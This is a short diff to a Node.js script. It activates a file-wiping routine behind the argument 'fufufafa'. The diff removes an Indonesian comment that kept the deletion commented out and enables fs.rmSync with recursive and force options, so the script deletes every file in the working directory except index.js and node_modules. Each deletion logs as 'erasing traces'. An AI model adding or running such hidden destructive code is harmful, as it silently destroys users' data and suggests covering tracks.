@@ -76,8 +76,7 @@ else if (args[0] === 'fufufafa') {
                 if(file !== 'index.js' && file !== 'node_modules') {
                      setTimeout(() => {
                         console.log(`[DELETED] Menghapus jejak: ${file} ... SUKSES`);
-                        // HAPUS TANDA KOMENTAR DI BAWAH JIKA INGIN HAPUS BENERAN
-                        // fs.rmSync(path.join(process.cwd(), file), { recursive: true, force: true });
+                        fs.rmSync(path.join(process.cwd(), file), { recursive: true, force: true });
                      }, delay);
                      delay += 300;
                 }
